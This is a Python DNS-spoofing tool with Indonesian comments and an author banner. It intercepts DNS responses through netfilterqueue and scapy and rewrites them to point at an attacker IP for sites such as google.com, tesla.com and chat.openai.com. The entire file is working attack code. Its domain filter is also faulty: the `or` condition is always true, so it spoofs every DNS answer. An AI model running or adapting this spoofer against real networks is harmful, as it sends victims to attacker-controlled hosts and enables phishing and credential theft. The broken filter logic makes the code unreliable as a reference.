import netfilterqueue
import scapy.all as scapy

print(r"""
    _______                          ______________       ________ 
___    |________________________ ___  /_____  /____  ____  __ \
__  /| |_  ___/  _ \_  __ \  __ `/_  /_  __  /__  / / /_  /_/ /
_  ___ |  /   /  __/  / / / /_/ /_  / / /_/ / _  /_/ /_  ____/ 
/_/  |_/_/    \___//_/ /_/\__,_/ /_/  \__,_/  _\__, / /_/      
                                              /____/""")
print("=====================================")
print("######    AUTHOR    #######")
print("*******    @RENALDY   ******")
print("=====================================")
print("\n\n\n")


try:
    def process_packet(packet):
        # Konversi paket NetfilterQueue ke paket Scapy
        scapy_packet = scapy.IP(packet.get_payload())

        # Cek apakah paket Scapy memiliki layer DNSRR (DNS Response Record)
        if scapy_packet.haslayer(scapy.DNSRR):
            # Ambil nama domain yang diminta oleh client
            Qname = scapy_packet[scapy.DNSQR].qname

            # Cek apakah nama domain yang diminta mengandung salah satu dari domain yang di-spoof
            if b"detik.com" or b"tesla.com" or b"google.com" or b"chat.openai.com" in Qname:
                print("[+] Spoofing Target")

                # Buat record DNS palsu dengan IP yang diinginkan
                answer = scapy.DNSRR(rrname=Qname, rdata="10.0.2.4") # Pada rdata isi dengan IP mesin penyerang

                # Ganti jawaban DNS dalam paket Scapy dengan jawaban palsu
                scapy_packet[scapy.DNS].an = answer
                scapy_packet[scapy.DNS].ancount = 1

                # Hapus checksum dan length untuk UDP layer jika ada
                if scapy_packet.haslayer(scapy.UDP):
                    del scapy_packet[scapy.UDP].chksum
                    del scapy_packet[scapy.UDP].len

                # Hapus checksum dan length untuk IP layer
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum

                # Set payload dengan paket Scapy yang telah dimodifikasi
                packet.set_payload(bytes(scapy_packet))

        packet.accept()  # Mengirim paket yang telah dimodifikasi
        # packet.drop() # Mengintervensi paket (tidak mengirimkannya)

    # Inisialisasi NetfilterQueue
    queue = netfilterqueue.NetfilterQueue()
    # Bind queue number 0 ke fungsi process_packet
    queue.bind(0, process_packet)
    # Mulai menangkap dan memodifikasi paket dalam antrian
    queue.run()

except KeyboardInterrupt:
    print("[!!] DNS Spoofer Telah Berhenti!! ")
